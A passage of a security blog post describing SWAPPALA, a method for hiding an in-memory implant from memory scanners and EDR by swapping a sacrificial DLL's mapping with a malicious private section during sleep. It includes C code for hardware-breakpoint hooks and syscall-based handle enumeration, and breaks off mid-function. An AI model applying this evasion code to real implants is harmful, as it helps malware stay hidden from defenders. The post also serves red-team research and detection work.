# https://oldboy21.github.io/posts/2024/05/swappala-why-change-when-you-can-hide/

<!DOCTYPE html><html lang="en" data-theme="light"><body><div class="container"><div class="content"><main class="post"><div class="post-info"><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>13 minutes</p></div><article><h1 class="post-title"><a href="https://oldboy21.github.io/posts/2024/05/swappala-why-change-when-you-can-hide/">SWAPPALA: Why Change When You Can Hide?</a></h1><div class="post-content"><p><img src="https://oldboy21.github.io/swappala/Untitled.png" alt="Untitled"></p><p>Hello everyone! It‚Äôs been a while, many things happening and not much time for coding. Hard times. Nonetheless I had little time frames for playing with some stuff I would define cool enough to write some lines about it. Last time we talked about <a href="https://oldboy21.github.io/posts/2024/02/reflective-dll-got-indirect-syscall-skills/">Indirect Syscalls for Reflective DLL</a> and I want to thank everyone who liked it and shared some feedback. After that I have decided to focus on in-memory obfuscation techniques since that poor Reflective DLL was target of those scary in-memory scanning tools.</p><h3 id="disclaimer">Disclaimer</h3><p>I write code and implement techniques for research and learning purposes only. Not trying to claim anything, just humbly sharing knowledge, experiences and code üòÄ feel always free to reach out for any doubts or question</p><h2 id="in-memory-obfuscation-what-why-and-how">In-memory Obfuscation: What? Why? and How?</h2><p>Once our beacon runs in memory we can‚Äôt really celebrate yet. Memory scanners can analyse portion of process memory in order to find whatever malware IOC we came up with. EDRs also have those capabilities and combinations of events might trigger the scan, but there are also other tools that focus only on this, for instance:</p><ul><li><a href="https://github.com/forrest-orr/moneta">Moneta</a></li><li><a href="https://github.com/hasherezade/pe-sieve">PE-sieve</a></li></ul><p>and some others. What does trigger these tools anger?</p><p>Well, something it is for example RWX memory not backed by file on disk etc. All those nasty stuff you do when you want to execute shellcode, load a PE in memory, stomp a DLL.</p><p>Want to more details about this? Yes? Then <a href="https://kyleavery.com/posts/avoiding-memory-scanners/">this</a> is a good start.</p><h2 id="what-i-want-to-achieve">What I Want To Achieve?</h2><p>How it went? This whole idea started while I was looking at module stomping to be honest. Loading a sacrificial DLL to allocate memory for my reflective DLL. While I was doing that I was also going through some video of <a href="https://institute.sektor7.net/">Sektor7</a> where they map/unmap a private unbacked section to hide the shellcode (SWAPPALA was inspired by that module in the Sektor7 course that I heavily suggest to buy). Not happy with my level of workload I started to take a look at Ekko and how I could play with it, as well as the various in memory obfuscation techniques that change protections of allocated memory and encrypt content. (<em>And prepping the Murph crossfit workout 44min bam bam bam</em>)</p><img src="https://media0.giphy.com/media/BBkKEBJkmFbTG/giphy.gif?cid=7941fdc665l816guhure2cjhs071fxjug3j0ojpocs38031g&amp;ep=v1_gifs_search&amp;rid=giphy.gif&amp;ct=g" class="center" alt="animated"><p>After many days of thinking and doubts, I realized what I wanted:</p><p>Use a Sacrificial DLL to load my Reflective DLL, stomp it and then restore the original content while sleeping. Cool, that did not go as smooth as it sounds since many were the challenges that I faced:</p><ul><li>Once you <em>LoadLibrary</em> a module, section and file handles are closed in the process</li><li>Once you <em>LoadLibrary</em> a module you do not have full permissions on the DLL (to <em>swappala</em> as you want)</li><li>Once you <em>LoadLibrary</em> a module, that memory is backed by a file on disk, that means that if you stomp it, unmap it and remap it, your nice IOCs are all gone since the main referment is always the file on disk. Unless you write also the file on disk (are you crazy?)</li><li>It is not super straightforward to use Ekko passing parameters on the stack (when they are more than 4 of course). All the threads share the same stack üòñ</li></ul><p>So as far as I remember at least 4 points were a problem, most likely more. What about the solutions?</p><ul><li>I have Hardware Breakpoints to hook functions and change parameters and/or block their execution üëÄ</li><li>I can map the view of a private RWX section (not backed by file) at the same address of a previously loaded DLL üëÄ</li><li>I can duplicate the stack of the Ekko threads and make sure they do not walk on each other üëÄ</li></ul><p>Not all the problems were solved, but at least in my mind what I had was good enough to slightly modify the initial idea and start coding something like this:</p><ol><li>Install hardware breakpoint on ZwClose and ZwMapViewOfSection: If you reverse a bit the LoadLibrary function, or simply debug a program that loads a library, you will notice that it basically <em>CreateSection</em> and <em>MapViewOfSection,</em> thus at a certain point the HANDLE objects of that legit windows DLL are going to appear somewhere in the kernel. However if you keep reversing the LoadLibrary function you will also notice that those handles (file/section) are closed after the library is loaded. Implementing HardwareBreakpoint on ZwClose and on MapViewOfSection we can prevent that the HANDLE objects are closed and that we get bit more power on the latters, something like SECTION_ALL_ACCESS. If this is successful you will find yourself granted with the power of mapping/unmapping that DLL as you wish üí™üèº</li><li>Load a sacrificial DLL: well, the first point it‚Äôs pretty useless till this happens ‚Üí load the dll, hardware breakpoint step in and <em>che bello</em></li><li>Enumerate KernelObjects to find the Section HANDLE of the sacrificial DLL: Well, this is bit of an extra step to be honest, or at least in the exact context of SWAPPALA it could be done in different ways. I have started this implementation for the Reflective DLL at first, where it was challenging to access to global variables in HBP detour functions, hence I have reversed the code of ProcessHacker and checked how that beautiful piece of C enumerates handles for each process üòî</li><li>Walk the sacrificial DLL headers and find its size: I want to create in memory a malicious private section that is as big as the sacrificial DLL</li><li>Unmap the sacrificial DLL (not unload! unmap!): We want to make space for our IOCs, after unmapping the view of the section of the sacrificial DLL, that address is free</li><li>Create a section and MapViewOfSection at the same address of the sacrificial DLL (and same size): I can use ZwMapViewOfSection here to force the private commit to be mapped at the ex-address of the sacrificial DLL</li><li>Write all the IOCs that you want in that space: write shellcode, load a DLL or just write ‚ÄúSWAPPALA‚Äù</li><li>Go to sleep:<ol><li>Duplicate the stack for some of the ROP</li><li>Unmap the malicious section</li><li>Re-map the sacrificial DLL at its very own address</li><li>Go to sleep</li><li>Unmap sacrificial DLL</li><li>Remap the malicious section</li></ol></li></ol><p>Wow, it is tiring even just thinking about it. Stop ranting let‚Äôs see some code.</p><h2 id="swappala">SWAPPALA</h2><p>Ok so let‚Äôs go through what I consider the most interesting parts of my code (full project on <a href="https://github.com/oldboy21/SWAPPALA/tree/main">Github</a>)</p><h3 id="install-hbp-on-zwclose-and-zwmapviewofsection">Install HBP on ZwClose and ZwMapViewOfSection</h3><p>We want to install breakpoint on those function for two reasons: preventing the Section handle of the sacrificial DLL to be closed, and be sure that handle will be forged with SECTION_ALL_ACCESS privileges. We start creating detour functions that do exactly this. These functions are executed once the ZwClose and ZwCreateSection are invoked.</p><div class="highlight"><div class="code-toolbar"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=" language-c"><code class=" language-c" data-lang="c">VOID <span class="token function">NtCreateSectionDetour</span><span class="token punctuation">(</span>PCONTEXT pThreadCtx<span class="token punctuation">)</span> <span class="token punctuation">{</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[i] NtCreateSection Hooked \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//modifying RDX (2nd parameter) before allowing execution</span>
    <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>pThreadCtx<span class="token operator">-&gt;</span>Rdx <span class="token operator">=</span> SECTION_ALL_ACCESS<span class="token punctuation">;</span>
    <span class="token comment">//resume execution</span>
    pThreadCtx<span class="token operator">-&gt;</span>EFlags <span class="token operator">=</span> pThreadCtx<span class="token operator">-&gt;</span>EFlags <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

VOID <span class="token function">ZwCloseDetour</span><span class="token punctuation">(</span>PCONTEXT pThreadCtx<span class="token punctuation">)</span> <span class="token punctuation">{</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[i] NtClose Hooked \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//modifying the RIP to a C3 (return instruction) hence blocking the execution of the ZwClose</span>
    pThreadCtx<span class="token operator">-&gt;</span>Rip <span class="token operator">=</span> <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span><span class="token operator">&amp;</span>ucRet<span class="token punctuation">;</span>
    <span class="token comment">//resume execution</span>
    pThreadCtx<span class="token operator">-&gt;</span>EFlags <span class="token operator">=</span> pThreadCtx<span class="token operator">-&gt;</span>EFlags <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><span>C</span></div></div></div></div><p>Going to keep the blog more clean and short this time, please refer to <a href="https://github.com/oldboy21/SWAPPALA/tree/main">Github project</a> for the full HBP implementation.</p><h3 id="enumerate-kernelobjects-to-find-the-section-handle-of-the-sacrificial-dll">Enumerate KernelObjects to find the Section HANDLE of the sacrificial DLL</h3><p>After my journey of reversing the code of ProcessHacker I got to the conclusion that if you want to know the Section that HANDLE belongs to, you got to map a lot of sections.</p><div class="highlight"><div class="code-toolbar"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=" language-c"><code class=" language-c" data-lang="c">HANDLE <span class="token function">FindSectionHandle</span><span class="token punctuation">(</span>PSYSCALL_ENTRY zwFunctions<span class="token punctuation">)</span> <span class="token punctuation">{</span>

   <span class="token punctuation">[</span>LOTS OF VARIABLES HERE<span class="token punctuation">]</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">ZwAllocateVirtualMemory</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token punctuation">(</span>LONG_PTR<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>objectTypeInfoTemp<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>objectTypeInfoSize<span class="token punctuation">,</span> MEM_RESERVE <span class="token operator">|</span> MEM_COMMIT<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">,</span> zwFunctions<span class="token punctuation">[</span>ZwAllocateVirtualMemoryF<span class="token punctuation">]</span><span class="token punctuation">.</span>SSN<span class="token punctuation">,</span> zwFunctions<span class="token punctuation">[</span>ZwAllocateVirtualMemoryF<span class="token punctuation">]</span><span class="token punctuation">.</span>sysretAddr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

        <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">ZwAllocateVirtualMemory</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token punctuation">(</span>LONG_PTR<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>objectNameInfo<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>objectNameInfoSize<span class="token punctuation">,</span> MEM_RESERVE <span class="token operator">|</span> MEM_COMMIT<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">,</span> zwFunctions<span class="token punctuation">[</span>ZwAllocateVirtualMemoryF<span class="token punctuation">]</span><span class="token punctuation">.</span>SSN<span class="token punctuation">,</span> zwFunctions<span class="token punctuation">[</span>ZwAllocateVirtualMemoryF<span class="token punctuation">]</span><span class="token punctuation">.</span>sysretAddr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

        <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    objectTypeInfo <span class="token operator">=</span> <span class="token punctuation">(</span>POBJECT_TYPE_INFORMATION<span class="token punctuation">)</span>objectTypeInfoTemp<span class="token punctuation">;</span>

    <span class="token comment">//to retrieve mapped section information</span>
    SYSTEM_HANDLE handle <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0x00</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
    DWORD PID <span class="token operator">=</span> <span class="token function">GetProcessId</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token punctuation">(</span>LONG_PTR<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>ULONG_PTR i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> handleInfo<span class="token operator">-&gt;</span>HandleCount<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

        handle <span class="token operator">=</span> handleInfo<span class="token operator">-&gt;</span>Handles<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>handle<span class="token punctuation">.</span>ProcessId <span class="token operator">==</span> PID<span class="token punctuation">)</span> <span class="token punctuation">{</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">ZwQueryObject</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>handle<span class="token punctuation">.</span>Handle<span class="token punctuation">,</span> ObjectTypeInformation<span class="token punctuation">,</span> objectTypeInfo<span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> zwFunctions<span class="token punctuation">[</span>ZwQueryObjectF<span class="token punctuation">]</span><span class="token punctuation">.</span>SSN<span class="token punctuation">,</span> zwFunctions<span class="token punctuation">[</span>ZwQueryObjectF<span class="token punctuation">]</span><span class="token punctuation">.</span>sysretAddr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

                <span class="token keyword">continue</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token comment">//check if i got an handle to a section object</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">CompareNStringWIDE</span><span class="token punctuation">(</span>objectTypeInfo<span class="token operator">-&gt;</span>Name<span class="token punctuation">.</span>Buffer<span class="token punctuation">,</span> section<span class="token punctuation">,</span> <span class="token punctuation">(</span>objectTypeInfo<span class="token operator">-&gt;</span>Name<span class="token punctuation">.</span>Length <span class="token operator">/</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>WCHAR<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> TRUE<span class="token punctuation">)</span> <span class="token punctuation">{</span>

                <span class="token comment">//comparing with IMAGE NOT AT BASE because that is the return value in status if i try to re-map the DLL, but it is actually mapped</span>

                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">ZwMapViewOfSection</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>handle<span class="token punctuation">.</span>Handle<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token punctuation">(</span>LONG_PTR<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>viewBase<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>viewSize<span class="token punctuation">,</span> ViewShare<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> PAGE_READONLY<span class="token punctuation">,</span> zwFunctions<span class="token punctuation">[</span>ZwMapViewOfSectionF<span class="token punctuation">]</span><span class="token punctuation">.</span>SSN<span class="token punctuation">,</span> zwFunctions<span class="token punctuation">[</span>ZwMapViewOfSectionF<span class="token punctuation">]</span><span class="token punctuation">.</span>sysretAddr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0x40000003</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

                    <span class="token comment">//if it actually was successfully but not for our DLL i need to clean up and continue</span>

                    <span class="token keyword">if</span> <span class="token punctuation">(</span>STATUS <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

                        <span class="token keyword">if</span> <span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">ZwUnmapViewOfSection</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token punctuation">(</span>LONG_PTR<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> viewBase<span class="token punctuation">,</span> zwFunctions<span class="token punctuation">[</span>ZwUnmapViewOfSectionF<span class="token punctuation">]</span><span class="token punctuation">.</span>SSN<span class="token punctuation">,</span> zwFunctions<span class="token punctuation">[</span>ZwUnmapViewOfSectionF<span class="token punctuation">]</span><span class="token punctuation">.</span>sysretAddr<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

                            <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

                        <span class="token punctuation">}</span>
                    <span class="token punctuation">}</span>
                    <span class="token comment">//it always needs to be null for the ZwMapViewOfSection to work</span>
                    viewBase <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
                    <span class="token keyword">continue</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>

                <span class="token keyword">if</span> <span class="token punctuation">(</span>viewBase <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

                    <span class="token comment">//here need to query the memory</span>
                    buffermeminfo <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
                    buffermeminfosize <span class="token operator">=</span> <span class="token number">0x100</span><span class="token punctuation">;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">ZwAllocateVirtualMemory</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token punctuation">(</span>LONG_PTR<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buffermeminfo<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buffermeminfosize<span class="token punctuation">,</span> MEM_RESERVE <span class="token operator">|</span> MEM_COMMIT<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">,</span> zwFunctions<span class="token punctuation">[</span>ZwAllocateVirtualMemoryF<span class="token punctuation">]</span><span class="token punctuation">.</span>SSN<span class="token punctuation">,</span> zwFunctions<span class="token punctuation">[</span>ZwAllocateVirtualMemoryF<span class="token punctuation">]</span><span class="token punctuation">.</span>sysretAddr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

                        <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>

                    <span class="token keyword">if</span> <span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">ZwQueryVirtualMemory</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token punctuation">(</span>LONG_PTR<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> viewBase<span class="token punctuation">,</span> MemoryMappedFilenameInformation<span class="token punctuation">,</span> buffermeminfo<span class="token punctuation">,</span> buffermeminfosize<span class="token punctuation">,</span> <span class="token operator">&amp;</span>returnLengthMem<span class="token punctuation">,</span> zwFunctions<span class="token punctuation">[</span>ZwQueryVirtualMemoryF<span class="token punctuation">]</span><span class="token punctuation">.</span>SSN<span class="token punctuation">,</span> zwFunctions<span class="token punctuation">[</span>ZwQueryVirtualMemoryF<span class="token punctuation">]</span><span class="token punctuation">.</span>sysretAddr<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x80000005</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

                        <span class="token comment">//free and re-allocate</span>
                        <span class="token comment">// FREE  </span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">ZwFreeVirtualMemory</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token punctuation">(</span>LONG_PTR<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buffermeminfo<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> MEM_RELEASE<span class="token punctuation">,</span> zwFunctions<span class="token punctuation">[</span>ZwFreeVirtualMemoryF<span class="token punctuation">]</span><span class="token punctuation">.</span>SSN<span class="token punctuation">,</span> zwFunctions<span class="token punctuation">[</span>ZwFreeVirtualMemoryF<span class="token punctuation">]</span><span class="token punctuation">.</span>sysretAddr<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

                            <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                        <span class="token comment">//re-allocate</span>
                        buffermeminfosize <span class="token operator">=</span> returnLengthMem<span class="token punctuation">;</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">ZwAllocateVirtualMemory</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token punctuation">(</span>LONG_PTR<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buffermeminfo<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buffermeminfosize<span class="token punctuation">,</span> MEM_RESERVE <span class="token operator">|</span> MEM_COMMIT<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">,</span> zwFunctions<span class="token punctuation">[</span>ZwAllocateVirtualMemoryF<span class="token punctuation">]</span><span class="token punctuation">.</span>SSN<span class="token punctuation">,</span> zwFunctions<span class="token punctuation">[</span>ZwAllocateVirtualMemoryF<span class="token punctuation">]</span><span class="token punctuation">.</span>sysretAddr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

                            <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                        <span class="token comment">//query memory again</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">ZwQueryVirtualMemory</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token punctuation">(</span>LONG_PTR<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> viewBase<span class="token punctuation">,</span> MemoryMappedFilenameInformation<span class="token punctuation">,</span> buffermeminfo<span class="token punctuation">,</span> buffermeminfosize<span class="token punctuation">,</span> <span class="token operator">&amp;</span>returnLengthMem<span class="token punctuation">,</span> zwFunctions<span class="token punctuation">[</span>ZwQueryVirtualMemoryF<span class="token punctuation">]</span><span class="token punctuation">.</span>SSN<span class="token punctuation">,</span> zwFunctions<span class="token punctuation">[</span>ZwQueryVirtualMemoryF<span class="token punctuation">]</span><span class="token punctuation">.</span>sysretAddr<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x80000005</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

                            <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

                        <span class="token punctuation">}</span>

                    <span class="token punctuation">}</span>
                    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>STATUS <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token comment">//if it's not buffer overflow but actual error i unmap the dll and continue</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">ZwUnmapViewOfSection</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token punctuation">(</span>LONG_PTR<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> viewBase<span class="token punctuation">,</span> zwFunctions<span class="token punctuation">[</span>ZwUnmapViewOfSectionF<span class="token punctuation">]</span><span class="token punctuation">.</span>SSN<span class="token punctuation">,</span> zwFunctions<span class="token punctuation">[</span>ZwUnmapViewOfSectionF<span class="token punctuation">]</span><span class="token punctuation">.</span>sysretAddr<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

                            <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

                        <span class="token punctuation">}</span>
                        viewBase <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
                        <span class="token keyword">continue</span><span class="token punctuation">;</span>

                    <span class="token punctuation">}</span>

                    memoryinfo <span class="token operator">=</span> <span class="token punctuation">(</span>PUNICODE_STRING<span class="token punctuation">)</span>buffermeminfo<span class="token punctuation">;</span>

                    <span class="token comment">//ConvertPointerToString(viewBase,buffersmg,20 );</span>

                    <span class="token keyword">if</span> <span class="token punctuation">(</span>memoryinfo<span class="token operator">-&gt;</span>Buffer <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                     
                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">containsSubstringUnicode</span><span class="token punctuation">(</span>memoryinfo<span class="token operator">-&gt;</span>Buffer<span class="token punctuation">,</span> SRH<span class="token punctuation">,</span> memoryinfo<span class="token operator">-&gt;</span>Length <span class="token operator">/</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>WCHAR<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

                            <span class="token comment">//i free the buffer memory</span>
                            <span class="token keyword">if</span> <span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">ZwFreeVirtualMemory</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token punctuation">(</span>LONG_PTR<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buffermeminfo<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> MEM_RELEASE<span class="token punctuation">,</span> zwFunctions<span class="token punctuation">[</span>ZwFreeVirtualMemoryF<span class="token punctuation">]</span><span class="token punctuation">.</span>SSN<span class="token punctuation">,</span> zwFunctions<span class="token punctuation">[</span>ZwFreeVirtualMemoryF<span class="token punctuation">]</span><span class="token punctuation">.</span>sysretAddr<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

                                <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
                            <span class="token punctuation">}</span>
                            <span class="token comment">//i unmap the section since i do not need it anymore</span>
                            <span class="token keyword">if</span> <span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">ZwUnmapViewOfSection</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token punctuation">(</span>LONG_PTR<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> viewBase<span class="token punctuation">,</span> zwFunctions<span class="token punctuation">[</span>ZwUnmapViewOfSectionF<span class="token punctuation">]</span><span class="token punctuation">.</span>SSN<span class="token punctuation">,</span> zwFunctions<span class="token punctuation">[</span>ZwUnmapViewOfSectionF<span class="token punctuation">]</span><span class="token punctuation">.</span>sysretAddr<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

                                <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

                            <span class="token punctuation">}</span>
                            <span class="token comment">// i return the handle i found</span>
